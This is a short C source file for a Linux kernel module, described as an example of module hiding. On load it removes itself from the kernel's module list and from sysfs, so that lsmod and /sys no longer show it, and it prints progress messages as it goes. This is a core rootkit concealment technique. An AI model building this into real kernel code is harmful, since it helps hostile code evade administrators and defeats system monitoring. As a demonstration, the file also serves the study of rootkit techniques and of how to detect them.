#include <linux/module.h>
#include <linux/init.h>

static int __init lkm_init(void)
{
        pr_info("\nHiding Module...\n");

        pr_info("  -- Hiding from lsmod...\n");

        list_del_init(&__this_module.list);

        pr_info("  -- Hiding for sysfs...\n");

        kobject_del(&(&__this_module)->mkobj.kobj);

        pr_info("Module Hided!\n");

        return 0;
}


static void __exit lkm_exit(void)
{
        pr_info("Exiting... Bye World\n");
}

module_init(lkm_init);                                                                 
module_exit(lkm_exit);                                                                               

MODULE_AUTHOR("Guillem Alminyana");
MODULE_LICENSE("GPL v2");
MODULE_DESCRIPTION("LKM Hide Module Example");
~                                                                                                                    
~                       
